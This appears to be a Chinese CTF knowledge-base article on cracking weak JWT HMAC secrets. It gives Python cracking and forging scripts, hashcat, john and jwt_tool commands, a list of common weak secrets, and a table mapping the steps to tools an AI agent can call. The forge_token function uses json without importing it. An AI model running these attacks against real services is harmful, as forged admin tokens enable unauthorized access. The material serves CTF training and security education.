---
id: "ctf-website/02-auth/jwt/03-weak-key-bruteforce"
title: "JWT 弱 HMAC 密钥爆破"
title_en: "JWT Weak HMAC Key Bruteforce"
summary: >
  介绍对 HS256/HS384/HS512 JWT 进行离线密钥爆破的攻击方法。当 HMAC 密钥强度不足时，攻击者可拿到一个合法 Token 后通过 hashcat、john 或自定义脚本离线暴力破解出密钥，之后无限伪造任意 Token。
summary_en: >
  A guide to offline brute-forcing HS256/HS384/HS512 JWT HMAC secrets. When the secret is weak, attackers can crack it from a single valid token using hashcat, john, or custom scripts, then forge unlimited tokens with the recovered key.
board: "ctf-website"
category: "02-auth"
signals: ["HMAC", "弱密钥", "爆破", "hashcat", "HS256", "JWT cracker", "wordlist", "secret"]
mcp_tools: ["run_ctf_tool", "http_probe"]
keywords: ["JWT爆破", "HMAC密钥", "hashcat jwt", "弱密钥", "jwt-cracker", "jwt_tool", "密钥破解", "HS256"]
difficulty: "beginner"
tags: ["authentication", "jwt", "bruteforce", "web-security", "crypto", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# JWT 弱 HMAC 密钥爆破

## 输入信号

- Header 中 `alg` 为 `HS256/HS384/HS512`
- Token 来自开发、测试、比赛靶场、默认部署、开源项目 demo
- `.env`, `config`, `package.json`, `docker-compose.yml` 暴露 `JWT_SECRET/APP_KEY/SECRET_KEY`
- 项目名、域名、公司名、题目名、环境名明显，可生成定制字典
- 多个 token 的 header/payload 结构一致，说明离线爆破稳定可复现

## 0. 字典优先级矩阵

| 来源 | 生成方式 | 命中倾向 |
|------|----------|----------|
| 配置泄露 | `JWT_SECRET`, `SECRET`, `APP_KEY` 原值及变体 | 最高 |
| 域名/项目名 | `target`, `target2026`, `target_secret` | CTF/开发环境 |
| 框架默认 | `secret`, `jwtsecret`, `changeme`, `your-256-bit-secret` | demo 项目 |
| Git 历史 | `git grep secret $(git rev-list --all)` | 迁移残留 |
| 题目语境 | 题目名、hint、作者名、flag 前缀 | CTF |

## 0.1 爆破结果判定

| 结果 | 判断 | 下一步 |
|------|------|--------|
| hashcat 命中 | secret 可复现签原 token | 伪造 role/uid/aud |
| 字典未命中 | HS 仍可能强密钥 | 转 claim/kid/jku |
| 多个 secret 命中 | 可能 token 被截断或算法错 | 用服务端 oracle 验证 |
| 伪造后 401 | claim/aud/iss 仍卡住 | 转 `06-claim-missing` |

## 原理

HS256/HS384/HS512 使用**对称密钥**，验证方和签发方共享同一个 secret。如果密钥强度不足（短密码、字典词、项目名），攻击者拿到一个合法 Token 后可离线暴力破解出密钥，之后无限伪造。

```
┌─────────────────────────────────────────────────────────┐
│ 攻击模型                                                │
│                                                         │
│   已获得: 一个有效的 HS256 JWT                           │
│   Token = Header.Payload.Sig                            │
│                                                         │
│   已知:   Sig = HMAC-SHA256(Header.Payload, secret)     │
│   未知:   secret                                        │
│                                                         │
│   方法:   离线猜测 secret，重算 HMAC，比对 Sig           │
│           匹配 → secret 被破解                           │
│                                                         │
│   复杂度: O(字典大小 × HMAC 计算)                        │
│           弱密钥（如 6 位小写字母）≈ 几秒                 │
│           强密钥（256-bit 随机）≈ 不可行                   │
└─────────────────────────────────────────────────────────┘
```

## 伪代码：暴力破解

```python
# brute_jwt_hs256.py
import hmac
import hashlib
import base64

def crack_jwt_secret(token: str, wordlist: list[str]) -> str | None:
    """
    对 HS256 JWT 进行离线字典攻击

    输入: token = "header.payload.signature"
          wordlist = ["secret", "password", "key123", ...]
    输出: 破解出的密钥，或 None
    """
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    header_b64, payload_b64, sig_b64 = parts
    message = f"{header_b64}.{payload_b64}".encode()

    # 目标签名 (Base64URL → bytes)
    # 补齐 Base64 padding
    sig_b64_padded = sig_b64 + '=' * (4 - len(sig_b64) % 4)
    target_sig = base64.urlsafe_b64decode(sig_b64_padded)

    for candidate in wordlist:
        computed_sig = hmac.new(
            candidate.encode(),
            message,
            hashlib.sha256
        ).digest()

        if hmac.compare_digest(computed_sig, target_sig):
            return candidate  # 破解成功

    return None  # 字典中未找到


def forge_token(header: dict, payload: dict, secret: str) -> str:
    """用破解出的密钥伪造 JWT"""
    def b64url(data):
        return base64.urlsafe_b64encode(
            json.dumps(data).encode()
        ).rstrip(b'=').decode()

    h_b64 = b64url(header)
    p_b64 = b64url(payload)
    sig = hmac.new(secret.encode(), f"{h_b64}.{p_b64}".encode(),
                   hashlib.sha256).digest()
    s_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    return f"{h_b64}.{p_b64}.{s_b64}"


# --- 攻击流程 ---
token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx"

# 步骤 1: 准备字典（自定义 + 公开字典）
wordlist = (
    open("custom_guesses.txt").read().splitlines() +
    open("/usr/share/wordlists/rockyou.txt", errors='ignore').read().splitlines()
)

# 步骤 2: 破解
secret = crack_jwt_secret(token, wordlist)
if secret:
    print(f"[+] Cracked! Secret = {secret}")
    # 步骤 3: 伪造
    admin = forge_token(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin", "role": "admin", "exp": 9999999999},
        secret
    )
    print(f"[+] Forged admin token: {admin}")
```

## 伪代码：增量爆破（自定义字符集）

```python
# 如果不确定密钥格式，可用有限字符集做增量爆破
import itertools

def crack_incremental(token: str, charset: str, max_len: int) -> str | None:
    """
    增量爆破：依次尝试长度 1..max_len 的所有排列
    适用于极短密钥 (≤ 6 字符)
    """
    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}".encode()
    target_sig = base64.urlsafe_b64decode(parts[2] + '==')

    for length in range(1, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            candidate = ''.join(combo)
            sig = hmac.new(candidate.encode(), message, hashlib.sha256).digest()
            if hmac.compare_digest(sig, target_sig):
                return candidate
    return None

# 仅小写字母 + 数字，最多 6 位
secret = crack_incremental(token, "abcdefghijklmnopqrstuvwxyz0123456789", 6)
```

## 常见弱密钥列表

```text
# 开发/测试环境高频密钥
secret
password
admin
key
private
changeme
test
dev
debug
jwt_secret
jwt_key
jwt-secret
SECRET_KEY
secretkey
mysecret

# 项目名/域名变体
[company_name]
[project_name]
[domain_name]
[docker_image_name]

# 简单模式
123456
qwerty
letmein
abcdef
aaaaaa
```

## 工具命令

```bash
# hashcat — GPU 加速 (mode 16500 = JWT)
echo "<token>" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 /tmp/jwt.txt -a 3 '?l?l?l?l?l?l'   # mask: 6位小写字母

# john
echo "<token>" > /tmp/jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/jwt.txt

# jwt_tool (CPU, 较慢)
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# c-jwt-cracker (C, 最快)
./jwt-cracker "<token>" "abcdefghijklmnopqrstuvwxyz0123456789" 6

# jwt-cracker (Go)
go run github.com/Sjord/jwt-cracker@latest "<token>"
```

## 检测信号

- Header 中 `alg` 为 `HS256` / `HS384` / `HS512`
- 无 `kid`/`jku`/`x5u` 字段（纯对称场景）
- 目标为开发/测试环境（弱密钥概率极高）
- 项目 GitHub 中有硬编码的 "secret" 或 "jwt_secret"

## HMAC 密钥强度对照

| 密钥类型 | 示例 | 爆破耗时 (单机) |
|----------|------|----------------|
| 6 位小写字母 | `abcdef` | < 1 秒 |
| 8 位小写+数字 | `abc12345` | ~ 1 分钟 |
| 常见单词 | `secret` | < 1 秒（字典命中） |
| 12 位随机 alphanum | `aB3xK9mP2qW7` | ~ 数年 |
| 256-bit 随机 | (32 random bytes) | 不可行 |

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| JWT 弱密钥爆破 | `run_ctf_tool jwt_tool` | 使用 jwt_tool 进行密钥爆破 |
| Token 验证 | `http_probe` | HTTP GET 探测验证破解 token 效果 |

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。


## Evidence

- `jwt_crack_manifest.json`: token header/payload hash、alg、wordlist 来源、工具、命中 secret hash。
- `forged_token_diff.json`: 原始用户 token、伪造 claims、接口响应、权限字段 diff。
- 成功样本: 破解出的 secret 能重新签原 token，伪造 `sub/role/aud` 后触发高权限响应或 flag。
- 失败样本: 字典/规则未命中、伪造签名通过但 claim 被拒、服务端 token 绑定 session。
- 下一跳: 爆破失败转 `01-alg-none`, `02-algorithm-confusion`, `04-kid-injection`；签名过了但权限未变转 `06-claim-missing`。
